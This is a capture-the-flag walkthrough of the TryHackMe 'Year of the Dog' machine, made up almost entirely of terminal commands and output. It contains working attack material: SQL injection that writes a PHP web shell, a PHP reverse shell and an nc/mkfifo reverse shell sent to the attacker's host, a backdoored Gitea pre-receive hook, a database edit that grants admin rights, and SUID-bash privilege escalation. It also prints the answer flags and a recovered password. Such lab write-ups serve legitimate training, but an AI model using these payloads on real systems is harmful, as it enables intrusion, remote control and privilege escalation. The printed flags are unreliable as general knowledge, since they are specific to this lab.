----
Always so polite...
----

![](https://i.imgur.com/riFhcXC.png)

### Task 1  Flags

 Start Machine

Who knew? The dog has some bite!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.8.29 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.8.29:22
Open 10.10.8.29:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 11:37 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:37
Completed Parallel DNS resolution of 1 host. at 11:37, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:37
Scanning 10.10.8.29 [2 ports]
Discovered open port 80/tcp on 10.10.8.29
Discovered open port 22/tcp on 10.10.8.29
Completed Connect Scan at 11:37, 0.32s elapsed (2 total ports)
Initiating Service scan at 11:37
Scanning 2 services on 10.10.8.29
Completed Service scan at 11:37, 6.82s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.8.29.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 8.80s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 1.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Nmap scan report for 10.10.8.29
Host is up, received user-set (0.32s latency).
Scanned at 2023-06-27 11:37:28 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4c9dd9bdb959efd19a9a60d4c439ffa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrxDlZxvJUZk2qXaeBdjHxfM3MSGpZ8H6zPqgarnP3K806zE1Y/CryyT4wgIZYomtV8wUWHlFkuqbWjcKcM1MWcPjzGWfPZ2wHTNgUkHvBWZ+fxoX8vJoC6wfpifa7bSMaOItFWSLnMGOXigHbF6dPNyP+/kXAJE+tg9TurrTKaPiL6u+02ITeVUuLWsjwlLDJAnu1zDhPONR2b7WTcU/zQxHUYZiHpHn5eBtXpCZPZyfOZ+828ibobM/CAHIBZqJsYksAe5RbtDw7Vdw/8OtYuo4Koz8C2kBoWCHvsmyDfwZ57E2Ycss4JG5j7fMt7sI+lh/NHE+/7zrXdH/4njCD
|   256 c3fc10d878477efb89cf818b6ef10afd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|   256 2768ffefc068e249755934f2bdf0c920 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQIHukp5WpajvhF4juRWmL2+YtbN9HbhgLScgqYNien
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds

cookie

be3d07e81db8665cb40f322eb0c7e55c'

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''be3d07e81db8665cb40f322eb0c7e55c''' at line 1

be3d07e81db8665cb40f322eb0c7e55c' union select 1, @@version-- -

You are number 5.7.34-0ubuntu0.18.04.1 in the queue

be3d07e81db8665cb40f322eb0c7e55c' union select 1, table_name FROM information_schema.tables-- -

You are number queue in the queue

be3d07e81db8665cb40f322eb0c7e55c' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -

You are number Error in the queue

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>

http://10.10.8.29/shell.php?cmd=whoami

www-data

http://10.10.8.29/shell.php?cmd=php%20-r%20%27$sock=fsockopen(%2210.8.19.103%22,4444);$proc=proc_open(%22/bin/bash%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.8.29] 49582
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@year-of-the-dog:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@year-of-the-dog:/var/www/html$ ifconfig
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:c9ff:feba:acb  prefixlen 64  scopeid 0x20<link>
        ether 02:42:c9:ba:0a:cb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 446 (446.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.8.29  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::4e:10ff:fe9a:c053  prefixlen 64  scopeid 0x20<link>
        ether 02:4e:10:9a:c0:53  txqueuelen 1000  (Ethernet)
        RX packets 54787  bytes 3305754 (3.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54829  bytes 3171323 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 124  bytes 10610 (10.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 124  bytes 10610 (10.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9e12dc0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::6c37:e3ff:fe79:450e  prefixlen 64  scopeid 0x20<link>
        ether 6e:37:e3:79:45:0e  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1522 (1.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@year-of-the-dog:/var/www/html$ cd /home
cd /home
www-data@year-of-the-dog:/home$ ls
ls
dylan
www-data@year-of-the-dog:/home$ cd dylan
cd dylan
www-data@year-of-the-dog:/home/dylan$ ls
ls
user.txt  work_analysis
www-data@year-of-the-dog:/home/dylan$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@year-of-the-dog:/home/dylan$ cat work_analysis
cat work_analysis
Sep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]
Sep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]
www-data@year-of-the-dog:/home/dylan$ grep "dylan" work_analysis
grep "dylan" work_analysis
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh dylan@10.10.8.29                              
dylan@10.10.8.29's password: Labr4d0rs4L1f3


	__   __                       __   _   _            ____              
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
	                                                                |___/ 


dylan@year-of-the-dog:~$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
dylan@year-of-the-dog:~$ ls
user.txt  work_analysis
dylan@year-of-the-dog:~$ cat user.txt 
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}

dylan@year-of-the-dog:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:c9ff:feba:acb  prefixlen 64  scopeid 0x20<link>
        ether 02:42:c9:ba:0a:cb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 446 (446.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.8.29  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::4e:10ff:fe9a:c053  prefixlen 64  scopeid 0x20<link>
        ether 02:4e:10:9a:c0:53  txqueuelen 1000  (Ethernet)
        RX packets 55000  bytes 3328316 (3.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54986  bytes 3280462 (3.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 124  bytes 10610 (10.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 124  bytes 10610 (10.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9e12dc0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::6c37:e3ff:fe79:450e  prefixlen 64  scopeid 0x20<link>
        ether 6e:37:e3:79:45:0e  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1522 (1.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

dylan@year-of-the-dog:~$ ss -tulwn
Netid     State       Recv-Q      Send-Q              Local Address:Port            Peer Address:Port      
icmp6     UNCONN      0           0                          *%eth0:58                         *:*         
udp       UNCONN      0           0                   127.0.0.53%lo:53                   0.0.0.0:*         
udp       UNCONN      0           0                 10.10.8.29%eth0:68                   0.0.0.0:*         
tcp       LISTEN      0           80                      127.0.0.1:3306                 0.0.0.0:*         
tcp       LISTEN      0           128                 127.0.0.53%lo:53                   0.0.0.0:*         
tcp       LISTEN      0           128                       0.0.0.0:22                   0.0.0.0:*         
tcp       LISTEN      0           128                     127.0.0.1:3000                 0.0.0.0:*         
tcp       LISTEN      0           128                     127.0.0.1:45345                0.0.0.0:*         
tcp       LISTEN      0           128                             *:80                         *:*         
tcp       LISTEN      0           128                          [::]:22                      [::]:*  

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.8.29 - - [27/Jun/2023 12:05:47] "GET /socat HTTP/1.1" 200 -

ylan@year-of-the-dog:~$ cd /tmp
dylan@year-of-the-dog:/tmp$ ls
systemd-private-077f5650c48a4fe38d1d59f7fb42caee-apache2.service-DCc14N
systemd-private-077f5650c48a4fe38d1d59f7fb42caee-systemd-resolved.service-wMk0BO
systemd-private-077f5650c48a4fe38d1d59f7fb42caee-systemd-timesyncd.service-Ug23q0
dylan@year-of-the-dog:/tmp$ wget http://10.8.19.103:1234/socat
--2023-06-27 17:13:21--  http://10.8.19.103:1234/socat
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat                      100%[=======================================>] 366.38K   239KB/s    in 1.5s    

2023-06-27 17:13:23 (239 KB/s) - ‘socat’ saved [375176/375176]

dylan@year-of-the-dog:/tmp$ chmod +x socat
dylan@year-of-the-dog:/tmp$ ./socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &
[1] 1683
http://10.10.8.29:8080/

register a new acc

dylan@year-of-the-dog:/tmp$ cd /gitea
dylan@year-of-the-dog:/gitea$ ls
git  gitea  ssh
dylan@year-of-the-dog:/gitea$ cd gitea/
dylan@year-of-the-dog:/gitea/gitea$ ls
attachments  avatars  conf  gitea.db  indexers  log  queues  sessions
dylan@year-of-the-dog:/gitea/gitea$ sqlite3 gitea.db

Command 'sqlite3' not found, but can be installed with:

apt install sqlite3
Please ask your administrator.

┌──(witty㉿kali)-[~/Downloads]
└─$ scp dylan@10.10.8.29:/gitea/gitea/gitea.db .
dylan@10.10.8.29's password: 
gitea.db               100% 1184KB 180.0KB/s   00:06 

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlite3 gitea.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> select * from user;
1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0
2|witty|witty||witty@gmail.com|0|enabled|2916d09404c275fbd39c4ff012b1a770003eade826874f2c2b06e538f483811c0f74867c64ca9934d0f5c95165a52bd420c9|argon2|0|0|0||0|||RDdggIj1tj|vOfpqoDOY9|en-US||1687882490|1687882490|1687882490|0|-1|1|0|0|0|0|1|0|eb1716e12e7ae420e2b0382d087df433|witty@gmail.com|0|0|0|0|0|0|0|0|0||gitea|0
sqlite> select lower_name, is_admin from user;
dylan|1
witty|0
sqlite> UPDATE user SET is_admin=1 WHERE lower_name="witty";
sqlite> select lower_name, is_admin from user;
dylan|1
witty|1
sqlite> .quit
┌──(witty㉿kali)-[~/Downloads]
└─$ scp /home/witty/Downloads/gitea.db dylan@10.10.217.23:/gitea/gitea/gitea.db
dylan@10.10.217.23's password: 
gitea.db                                              100% 1184KB 208.9KB/s   00:05  

update page and now we have admin privileges

create a new repository and http://10.10.217.23:8080/witty/testing/settings/hooks/git/pre-receive

#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi
mkfifo /tmp/f; nc 10.8.19.103 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

dylan@year-of-the-dog:/gitea/gitea$ cd /tmp
dylan@year-of-the-dog:/tmp$ git clone http://localhost:3000/witty/testing && cd testing
Cloning into 'testing'...
warning: You appear to have cloned an empty repository.
dylan@year-of-the-dog:/tmp/testing$ echo "test" >> README.md
dylan@year-of-the-dog:/tmp/testing$ git add README.md
dylan@year-of-the-dog:/tmp/testing$ git commit -m "Exploit"
[master (root-commit) 0add72d] Exploit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
dylan@year-of-the-dog:/tmp/testing$ git push
Username for 'http://localhost:3000': witty
Password for 'http://witty@localhost:3000': 
Counting objects: 3, done.
Writing objects: 100% (3/3), 217 bytes | 217.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.217.23] 39305
which python3
which python
bash
id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL
    
Container Privesc

sudo -s
whoami
root
cd /root
ls

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh dylan@10.10.217.23      
dylan@10.10.217.23's password: 


 ____              
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
	                                                                |___/ 


dylan@year-of-the-dog:~$ cd /bin
dylan@year-of-the-dog:/bin$ ls
bash                journalctl     pwd
btrfs               kbd_mode       rbash
btrfsck             kill           readlink
btrfs-debug-tree    kmod           red
btrfs-find-root     less           rm
btrfs-image         lessecho       rmdir
btrfs-map-logical   lessfile       rnano
btrfs-select-super  lesskey        run-parts
btrfstune           lesspipe       sed
btrfs-zero-log      ln             setfacl
bunzip2             loadkeys       setfont
busybox             login          setupcon
bzcat               loginctl       sh
bzcmp               lowntfs-3g     sh.distrib
bzdiff              ls             sleep
bzegrep             lsblk          ss
bzexe               lsmod          static-sh
bzfgrep             mkdir          stty
bzgrep              mkfs.btrfs     su
bzip2               mknod          sync
bzip2recover        mktemp         systemctl
bzless              more           systemd
bzmore              mount          systemd-ask-password
cat                 mountpoint     systemd-escape
chacl               mt             systemd-hwdb
chgrp               mt-gnu         systemd-inhibit
chmod               mv             systemd-machine-id-setup
chown               nano           systemd-notify
chvt                nc             systemd-sysusers
cp                  nc.openbsd     systemd-tmpfiles
cpio                netcat         systemd-tty-ask-password-agent
dash                netstat        tar
date                networkctl     tempfile
dd                  nisdomainname  touch
df                  ntfs-3g        true
dir                 ntfs-3g.probe  udevadm
dmesg               ntfscat        ulockmgr_server
dnsdomainname       ntfscluster    umount
domainname          ntfscmp        uname
dumpkeys            ntfsfallocate  uncompress
echo                ntfsfix        unicode_start
ed                  ntfsinfo       vdir
egrep               ntfsls         wdctl
false               ntfsmove       which
fgconsole           ntfsrecover    whiptail
fgrep               ntfssecaudit   ypdomainname
findmnt             ntfstruncate   zcat
fsck.btrfs          ntfsusermap    zcmp
fuser               ntfswipe       zdiff
fusermount          open           zegrep
getfacl             openvt         zfgrep
grep                pidof          zforce
gunzip              ping           zgrep
gzexe               ping4          zless
gzip                ping6          zmore
hostname            plymouth       znew
ip                  ps
https://chmodcommand.com/chmod-4755/

dylan@year-of-the-dog:/bin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [27/Jun/2023 17:49:09] "GET /bash HTTP/1.1" 200 -

inside container
wget 172.17.0.1:8000/bash -O /data/bash
Connecting to 172.17.0.1:8000 (172.17.0.1:8000)
saving to '/data/bash'
bash                 100% |********************************| 1087k  0:00:00 ETA
'/data/bash' saved
chmod 4755 /data/bash

dylan@year-of-the-dog:/bin$ cd /gitea
dylan@year-of-the-dog:/gitea$ ls
bash  git  gitea  ssh
dylan@year-of-the-dog:/gitea$ ./bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}

```

User Flag  

*THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}*

Root Flag

*THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}*

[[Madeye's Castle]]